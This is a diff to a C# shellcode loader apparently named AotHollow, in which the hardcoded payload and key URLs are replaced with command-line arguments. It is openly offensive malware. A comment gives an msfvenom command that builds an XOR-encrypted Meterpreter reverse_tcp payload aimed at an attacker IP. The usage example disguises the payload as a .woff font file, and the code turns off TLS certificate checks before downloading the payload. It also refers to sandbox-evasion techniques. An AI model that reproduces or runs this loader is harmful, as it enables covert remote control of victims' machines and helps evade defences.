@@ -609,6 +609,13 @@ namespace Runner
 
         public static void Main(string[] args)
         {
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Usage: AotHollow.exe [candy url] [key url]");
+                Console.WriteLine("Example: AotHollow.exe https://myhost.com/sd.woff https://myhost.com/key.txt");
+                return ;
+            }
+            
             //Removed Sandbox Evasion stuff. Just import delegates and the evasion technique you need from classic drunner
 
             /*
@@ -616,8 +623,8 @@ namespace Runner
                msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.133.128 LPORT=443 --encrypt xor --encrypt-key thexorkey EXITFUNC=thread  -f raw -o sh.bin
                Server the files with python3 -m http.server 80 or updog -p 80
             */
-            string sh = "http://192.168.133.128/sh.bin";
-            string dkey = "http://192.168.133.128/key.txt";
+            string sh = args[0];
+            string dkey = args[1];
 
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new System.Net.WebClient();
